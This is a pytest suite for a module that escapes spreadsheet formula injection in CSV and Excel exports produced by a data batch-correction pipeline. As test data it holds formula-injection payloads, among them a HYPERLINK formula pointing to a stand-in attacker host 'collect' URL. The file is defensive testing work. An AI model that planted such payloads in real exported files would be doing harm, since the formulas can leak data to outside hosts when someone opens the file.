import csv
import json

import pandas as pd
import pytest
from openpyxl import load_workbook

from scripts import batch_correction, loaders
from scripts.spreadsheet_safety import (
    escape_spreadsheet_formula,
    sanitize_dataframe_for_spreadsheet,
    write_csv_safely,
    write_excel_safely,
)


def test_escape_spreadsheet_formula_prefixes():
    assert escape_spreadsheet_formula('=HYPERLINK("http://example.com")') == (
        '\'=HYPERLINK("http://example.com")'
    )
    assert escape_spreadsheet_formula("+cmd") == "'+cmd"
    assert escape_spreadsheet_formula("-cmd") == "'-cmd"
    assert escape_spreadsheet_formula("@cmd") == "'@cmd"
    assert escape_spreadsheet_formula("\t=SUM(1,2)") == "'\t=SUM(1,2)"
    assert escape_spreadsheet_formula(' =HYPERLINK("x")') == '\' =HYPERLINK("x")'
    assert escape_spreadsheet_formula("safe") == "safe"
    assert escape_spreadsheet_formula(1) == 1


def test_sanitize_dataframe_returns_equivalent_without_object_columns():
    dataframe = pd.DataFrame({"value": [1, 2]})

    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert sanitized is not dataframe
    pd.testing.assert_frame_equal(sanitized, dataframe)


def test_batch_process_escapes_formula_like_raw_cells(tmp_path, monkeypatch):
    batch_correction.load_config_func = loaders.load_config
    monkeypatch.chdir(tmp_path)

    data_dir = tmp_path / "data"
    output_dir = tmp_path / "out"
    data_dir.mkdir()
    output_dir.mkdir()

    payload = '=HYPERLINK("http://attacker.example/collect","click")'
    (data_dir / "S26_Y01.txt").write_text(
        "\n".join(
            [
                "0 10 20",
                f"1 11 {payload}",
                "2 12 22",
                "3 13 23",
                "4 14 24",
                "5 15 25",
                "6 16 26",
                "7 17 27",
                "8 18 28",
                "9 19 29",
            ]
        ),
        encoding="utf-8",
    )
    config_path = tmp_path / "config.json"
    config_path.write_text(
        json.dumps(
            {
                "RAW_DATA_DIR": str(data_dir),
                "SENSOR_TO_RIVER": {"26": 54.0},
                "defaults": {
                    "window_size": 5,
                    "threshold": 100,
                    "gap_threshold_factor": 100,
                    "gap_method": "linear",
                    "outlier_method": "median",
                },
            }
        ),
        encoding="utf-8",
    )

    config = batch_correction.BatchConfig(
        series_selection="26",
        river_miles=[54.0],
        years=(1995, 1995),
        dry_run=False,
        config_path=str(config_path),
        output_dir=str(output_dir),
    )
    batch_correction.batch_process(config)

    workbook = load_workbook(output_dir / "Year_1995 (Y01)_Data.xlsx", data_only=False)
    cell = workbook.active["C2"]
    assert cell.value == "'" + payload
    assert cell.data_type == "s"


def test_sanitize_dataframe_escapes_category_columns():
    import pandas as pd

    dataframe = pd.DataFrame({"value": pd.Categorical(["=1+2", "safe"])})
    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert sanitized["value"].iloc[0] == "'=1+2"
    assert sanitized["value"].iloc[1] == "safe"
    assert isinstance(sanitized["value"].dtype, pd.CategoricalDtype)


# -----------------------------------------------------------------------------
# Expanded cell-encoder unit tests
# -----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("=SUM(1,1)", "'=SUM(1,1)"),
        ("+1+1", "'+1+1"),
        ("-1+1", "'-1+1"),
        ("@SUM(1,1)", "'@SUM(1,1)"),
        ("\t=SUM(1,1)", "'\t=SUM(1,1)"),
        ("\r\n=SUM(1,1)", "'\r\n=SUM(1,1)"),
        ("  =SUM(1,1)", "'  =SUM(1,1)"),
        ("＝SUM(1,1)", "'＝SUM(1,1)"),
        ("＋1", "'＋1"),
        ("－1", "'－1"),
        ("＠SUM(1,1)", "'＠SUM(1,1)"),
        ("safe", "safe"),
        ("a=b", "a=b"),
        ("'", "'"),
        ("'=already", "'=already"),
        ("  '+cmd", "  '+cmd"),
        ("", ""),
        (1, 1),
        (1.5, 1.5),
        (None, None),
    ],
)
def test_escape_spreadsheet_formula(value, expected):
    assert escape_spreadsheet_formula(value) == expected


def test_escape_spreadsheet_formula_is_idempotent():
    payload = '=HYPERLINK("http://x")'
    once = escape_spreadsheet_formula(payload)
    twice = escape_spreadsheet_formula(once)
    assert once == "'" + payload
    assert twice == once


def test_sanitize_dataframe_does_not_mutate_input():
    dataframe = pd.DataFrame({"value": ["=1"]})
    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert sanitized is not dataframe
    assert dataframe["value"].iloc[0] == "=1"
    assert sanitized["value"].iloc[0] == "'=1"


def test_sanitize_dataframe_escapes_column_and_index_labels():
    dataframe = pd.DataFrame(
        {"=header": ["=cell"]}, index=pd.Index(["=idx"], name="=name")
    )
    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert list(sanitized.columns) == ["'=header"]
    assert list(sanitized.index) == ["'=idx"]
    assert sanitized.index.name == "'=name"


def test_sanitize_dataframe_escapes_multiindex():
    columns = pd.MultiIndex.from_tuples([("=a", "=b"), ("c", "d")])
    index = pd.MultiIndex.from_tuples([("=i", "=j")], names=["=in", "=jn"])
    dataframe = pd.DataFrame([[1, 2]], columns=columns, index=index)
    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert list(sanitized.columns) == [("'=a", "'=b"), ("c", "d")]
    assert list(sanitized.index) == [("'=i", "'=j")]
    assert list(sanitized.index.names) == ["'=in", "'=jn"]


def test_sanitize_dataframe_null_byte_in_cell_raises():
    dataframe = pd.DataFrame({"value": ["a\x00b"]})
    with pytest.raises(ValueError, match="Null byte"):
        sanitize_dataframe_for_spreadsheet(dataframe)


def test_sanitize_dataframe_null_byte_in_column_raises():
    dataframe = pd.DataFrame({"a\x00b": [1]})
    with pytest.raises(ValueError, match="Null byte"):
        sanitize_dataframe_for_spreadsheet(dataframe)


def test_sanitize_dataframe_null_byte_in_index_raises():
    dataframe = pd.DataFrame({"value": [1]}, index=["a\x00b"])
    with pytest.raises(ValueError, match="Null byte"):
        sanitize_dataframe_for_spreadsheet(dataframe)


def test_sanitize_dataframe_categorical_collision_fallback():
    dataframe = pd.DataFrame({"value": pd.Categorical(["=x", "'=x"])})
    sanitized = sanitize_dataframe_for_spreadsheet(dataframe)
    assert sanitized["value"].iloc[0] == "'=x"
    assert sanitized["value"].iloc[1] == "'=x"


def test_write_excel_safely_stores_payload_as_text(tmp_path):
    payloads = [
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(1,1)",
        "\t=1+1",
        "\n=1+1",
        "  =1+1",
        "＝1+1",
        "a=b",
    ]
    df = pd.DataFrame({"value": payloads})
    out_path = tmp_path / "out.xlsx"
    write_excel_safely(df, out_path, index=False)

    workbook = load_workbook(out_path, data_only=False)
    for row in workbook.active.iter_rows(min_row=2, max_col=1):
        cell = row[0]
        assert cell.data_type == "s"
        assert not cell.value.startswith(("=", "+", "-", "@"))


def test_write_csv_safely_neutralizes_payloads(tmp_path):
    payloads = [
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(1,1)",
        "\t=1+1",
        "  =1+1",
        "＝1+1",
        "a=b",
        'a,b";=1+1',
        "a\nb;=1+1",
    ]
    df = pd.DataFrame({"value": payloads})
    out_path = tmp_path / "out.csv"
    write_csv_safely(df, out_path, index=False)

    with open(out_path, newline="") as f:
        rows = list(csv.reader(f))
    assert rows[0] == ["value"]
    for row in rows[1:]:
        value = row[0]
        # First logical character cannot be a formula initiator.
        assert not value.startswith(("=", "+", "-", "@"))
        # No payload has been split into an additional cell by quoting/escaping.
        assert len(row) == 1


def test_write_excel_safely_rejects_invalid_sheet_name(tmp_path):
    df = pd.DataFrame({"value": [1]})
    with pytest.raises(ValueError, match="sheet_name"):
        write_excel_safely(df, tmp_path / "out.xlsx", sheet_name="bad[name]")


def test_write_excel_safely_sanitizes_custom_header_and_index_label(tmp_path):
    df = pd.DataFrame({"a": ["=1"]})
    out_path = tmp_path / "out.xlsx"
    write_excel_safely(df, out_path, header=["=header"], index_label="=idx")
    workbook = load_workbook(out_path, data_only=False)
    # Default index=True: index label goes in column A, header in column B.
    assert workbook.active["A1"].value == "'=idx"
    assert workbook.active["B1"].value == "'=header"


def test_write_csv_safely_sanitizes_custom_header_and_index_label():
    df = pd.DataFrame({"a": ["=1"]}, index=["=row"])
    output = write_csv_safely(df, index=True, header=["=header"], index_label="=idx")
    header_line = output.strip().split("\n")[0]
    assert header_line == "'=idx,'=header"
    data_line = output.strip().split("\n")[1]
    assert data_line.startswith("'=row,'=1")
